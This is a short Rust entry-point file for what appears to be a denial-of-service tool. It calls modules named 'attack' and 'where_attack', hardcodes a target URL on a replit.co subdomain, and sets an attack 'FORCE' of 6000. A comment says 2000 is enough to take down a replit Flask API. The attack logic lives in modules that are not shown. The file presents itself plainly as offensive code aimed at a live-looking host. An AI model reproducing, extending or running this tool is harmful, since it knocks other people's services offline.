mod attack;
mod ram_manger;
mod where_attack;

#[tokio::main]
async fn main() {
    let init_data = where_attack::where_attack();
    attack::start(init_data).await;
}

pub static ATTACK_URL: &str = "https://SameSpottedStaff.carghai74.repl.co";
pub static FORCE: u128 = 6000;
// 2000 to can take down a replit flask api
// This is the code
// app.route('/hard')
// def hard_dos():
//   return "failure"
